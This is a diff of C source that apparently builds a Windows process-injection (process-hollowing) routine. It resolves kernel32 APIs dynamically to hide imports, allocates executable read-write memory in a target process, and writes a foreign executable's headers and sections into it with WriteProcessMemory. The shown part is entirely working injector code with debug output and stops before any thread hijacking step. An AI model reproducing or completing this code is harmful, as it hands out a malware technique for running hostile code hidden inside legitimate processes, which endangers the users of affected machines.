@@ -210,7 +210,7 @@ int wmain()
 #endif
 	HANDLE heappi= GetProcessHeapo(); 
 #ifdef DEBUG
-	printf("\n[+]address of RtlAllocateHeap = 0x%x\n",(DWORD)RtlAllocateH);
+	printf("[+] address of RtlAllocateHeap = 0x%x\n",(DWORD)RtlAllocateH);
 #endif
 	LPVOID srcBuffer = RtlAllocateH(heappi, HEAP_ZERO_MEMORY, srcSize);
 	_ReadFile ReadFil = find_function_address(kernel32_base, "ReadFile");
@@ -226,15 +226,38 @@ int wmain()
 	printf("[+] src image size 0x%x\n" ,srcImgSize); 
 #endif
 
-	/* ideally we allocate memory on targetimagebase , but I kept getting ERROR_INVALID_ADDRESS	
-	If this address is within an enclave that you have not initialized by calling InitializeEnclave, VirtualAllocEx allocates a page of zeros for the enclave at that address. The page must be previously uncommitted, and will not be measured with the EEXTEND instruction of the Intel Software Guard Extensions programming model.
-If the address in within an enclave that you initialized, then the allocation operation fails with the ERROR_INVALID_ADDRESS error.
+	/* 
+	ideally we allocate memory on targetimagebase , but I kept getting ERROR_INVALID_ADDRESS	
+	If this address is within an enclave that you have not initialized by calling InitializeEnclave, VirtualAllocEx allocates a page of zeros for the enclave at that address. 
+	The page must be previously uncommitted, and will not be measured with the EEXTEND instruction of the Intel Software Guard Extensions programming model.
+	If the address in within an enclave that you initialized, then the allocation operation fails with the ERROR_INVALID_ADDRESS error.
 	*/
 	_VirtualAllocEx VirtualAll = find_function_address(kernel32_base, "VirtualAllocEx");
-	printf("targetimagebase is = %x",TargetImageBase);
-	LPVOID DstImgBase = VirtualAll(target, NULL, srcImgSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
+	printf("[+] targetimagebase is = %x\n",(DWORD)TargetImageBase);
+	LPVOID DstImgBase = VirtualAll(target, NULL, srcImgSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	if (!DstImgBase) {
 #ifdef DEBUG
-	printf("[+] DstImgBase = 0x%x , error = %d",DstImgBase,GetLastError() ); 
+		printf("[+] error error error error error");
 #endif
+		return 0xDEADBEEF;
+	}
+	TargetImageBase = DstImgBase; 
+	DWORD Diff = (DWORD)DstImgBase - srcNtHeaders->OptionalHeader.ImageBase; 
 
+#ifdef DEBUG 
+	printf("[+] log about Imagebase:\n\tPrefered Source image = 0x%x\n\tMemory on destination allocated at = 0x%x\n\tDifference = 0x%x", srcNtHeaders->OptionalHeader.ImageBase, (DWORD)DstImgBase,Diff);
+#endif
+	
+	/*copying headers*/
+	srcNtHeaders->OptionalHeader.ImageBase =(DWORD)TargetImageBase;
+	_WriteProcessMemory WriteProcessMem = find_function_address(kernel32_base,"WriteProcessMemory");
+	WriteProcessMem(target, DstImgBase,srcBuffer, srcNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
+ 
+	PIMAGE_SECTION_HEADER srcImageSection = (PIMAGE_SECTION_HEADER)((DWORD)srcBuffer + srcDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
+
+	/*copying sections*/
+	for (BYTE Section = 0; Section < srcNtHeaders->FileHeader.NumberOfSections; Section++,srcImageSection++)
+		WriteProcessMemory(target, (PVOID)((DWORD)TargetImageBase + srcImageSection->VirtualAddress), (PVOID)((DWORD)srcBuffer + srcImageSection->PointerToRawData), srcImageSection->SizeOfRawData, NULL);
+
+	return 0x1;
 }
